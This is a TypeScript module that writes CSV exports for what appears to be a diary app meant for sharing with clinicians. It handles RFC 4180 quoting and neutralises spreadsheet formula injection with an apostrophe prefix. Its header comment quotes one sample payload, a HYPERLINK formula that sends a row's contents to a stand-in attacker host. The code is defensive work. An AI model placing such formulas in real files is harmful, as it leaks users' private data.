/**
 * Writing CSV that a spreadsheet cannot misread, and cannot be tricked by.
 *
 * Two separate problems, and only the first is the one people remember.
 *
 * **Escaping** is the familiar one: a note containing a comma, a quote or a newline must not shift
 * every following column. RFC 4180 quoting handles it, and a diary is full of free text, so this
 * is not a hypothetical.
 *
 * **Formula injection** is the one that matters more. A cell beginning `=`, `+`, `-`, `@`, tab or
 * carriage return is interpreted as a formula by Excel, Numbers and Google Sheets. A note reading
 * `=HYPERLINK("https://evil.example/"&A1,"click")` becomes a live link carrying the row's contents
 * the moment the file is opened. In this app the attacker and the victim are usually the same
 * person, which makes it low-risk — but this export is meant to be handed to a clinician, and it is
 * exactly the file someone forwards. Prefixing with an apostrophe is the standard defence: the cell
 * still reads correctly, and it is no longer a formula.
 */

/** Characters that make a spreadsheet treat a cell as a formula rather than text. */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

/**
 * One value, safe to place in a cell.
 *
 * The apostrophe goes on before the quoting, not after, so the escaping wraps the neutralised
 * value rather than the other way round.
 */
export function csvCell(value: string | number | boolean | null | undefined): string {
  if (value === null || value === undefined) return '';

  const text = String(value);
  if (text.length === 0) return '';

  const neutralised = FORMULA_PREFIXES.some((prefix) => text.startsWith(prefix))
    ? `'${text}`
    : text;

  const mustQuote = /[",\r\n]/.test(neutralised);
  return mustQuote ? `"${neutralised.replace(/"/g, '""')}"` : neutralised;
}

export function csvRow(values: (string | number | boolean | null | undefined)[]): string {
  return values.map(csvCell).join(',');
}

/**
 * A whole file.
 *
 * CRLF because RFC 4180 says so and because Excel on Windows is the most likely destination for a
 * file a person exports to show someone.
 */
export function csvFile(
  headers: string[],
  rows: (string | number | boolean | null | undefined)[][]
): string {
  return [csvRow(headers), ...rows.map(csvRow)].join('\r\n');
}
